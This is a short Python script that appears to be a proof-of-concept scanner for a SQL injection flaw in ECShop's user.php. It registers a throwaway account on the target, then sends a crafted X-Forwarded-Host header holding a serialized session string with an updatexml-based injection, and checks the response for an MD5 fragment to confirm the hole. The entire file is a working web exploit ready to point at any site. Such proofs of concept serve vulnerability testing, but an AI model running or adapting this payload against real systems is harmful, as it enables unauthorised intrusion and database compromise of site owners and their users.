import requests,re,urllib3
from hashlib import md5

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r11=randomInt(10000, 99999)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
username=randomLowercase(8)
email=str(randomInt(10000000,99999999))
phone=str(randomInt(1000000000,9999999999))
def substr(strs,s,lens):
	result=strs[s:lens]
	return result
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+'user.php'
	headers={
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0',
	'Content-Type': 'application/x-www-form-urlencoded'
	}
	body='username='+username+'&email='+email+'@qq.com&password=123456&confirm_password=123456&extend_field2=&extend_field3=&extend_field4=&extend_field5=1'+phone+'&sel_question=0&passwd_answer=&captcha=&sms_code=&agreement=1&act=act_register&Submit='
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if '用户名 '+username+' 注册成功' in response.text:
		r0=True
		ECS_ID=re.findall('ECS_ID=(.+?);',response.headers['Set-Cookie'])[0]
	else:
		r0=False
	url=baseurl+"user.php?act=collection_list"
	headers={'X-Forwarded-Host': '45ea207d7a2b68c49582d2d22adf953apay_log|s:55:"1\' and updatexml(1,insert(md5('+str(r11)+'),1,1,0x7e),1) and \'";|45ea207d7a2b68c49582d2d22adf953a','Cookie':'ECS_ID='+ECS_ID}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if substr(md5(str(r11).encode()).hexdigest(), 1, 31) in response.text:
		r1=True
	else:
		r1=False
	if r0 and r1:
		return True
	else:
		return False
